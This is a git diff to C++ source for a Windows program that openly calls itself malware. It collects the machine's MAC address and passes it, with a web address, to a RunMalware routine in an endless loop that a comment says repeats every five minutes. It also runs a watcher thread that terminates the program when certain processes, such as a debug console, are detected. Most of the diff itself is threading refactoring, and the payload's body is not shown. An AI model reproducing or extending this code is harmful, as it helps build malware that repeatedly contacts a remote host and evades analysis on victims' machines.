@@ -1,6 +1,6 @@
 #include "Header.h"
 #include <stdio.h>
-#pragma warning( disable : 4365 5045)
+#pragma warning( disable : 4365 5045 5039)
 
 #pragma warning( push )
 #pragma warning( disable : 4820 4668 5039 4355 4625 4626 5026 5027 5204 5220)
@@ -12,7 +12,6 @@
 #pragma warning( pop )
 #include <Psapi.h>
 #include <iostream>
-
 
 
 
@@ -109,7 +108,8 @@ bool RunMalware(const wstring web_address, const wstring mac_address) {
 }
 
 
-void ProccessChecker() {
+DWORD WINAPI ProccessChecker(LPVOID lpParam) {
+    if(lpParam) {}
     const unordered_set<wstring> target_processes{ L"VsDebugConsol1e.exe", L"slack.exe1" , L"OneDrive.exe1" };
 
     while (true)
@@ -123,7 +123,6 @@ void ProccessChecker() {
             exit(EXIT_FAILURE);
         }
     }
-
 }
 
 bool GetMacAddress(wstring& mac_address) {
@@ -185,7 +184,11 @@ bool GetMacAddress(wstring& mac_address) {
 int main(void)
 {
     // Runs process-checker in a separate treade, once it fails it exits the entire process.
-    thread th1(ProccessChecker);
+    HANDLE hThread = CreateThread(NULL, 0, ProccessChecker, NULL, 0, NULL);
+    if (NULL == hThread) {
+        printf("Failed to create process-checker thread!");
+        return 1;
+    }
     
     // Every 5 minutes runs the malware
     wstring mac_address;
@@ -197,10 +200,6 @@ int main(void)
 
     while (true)
     {
-        //future<bool> future_success = async(launch::async, RunMalware, web_address, mac_address);
-
-        //bool success = future_success.get();
-        //if (!success)
         if (!RunMalware(web_address, mac_address))
         {
             printf("Failed to run malware!");
